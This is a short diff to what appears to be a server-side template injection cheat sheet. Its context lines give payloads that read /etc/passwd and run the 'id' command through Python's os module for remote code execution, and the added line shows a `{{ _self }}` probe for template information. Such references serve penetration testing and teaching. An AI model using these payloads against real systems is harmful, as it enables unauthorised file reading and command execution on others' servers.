@@ -67,3 +67,4 @@ To open a file : `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").
 
 For remote code execution we can use : `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | In this command, it first imports the OS library and then runs the command 'id'.
 
+To get information regarding the current template : `{{ _self }}`
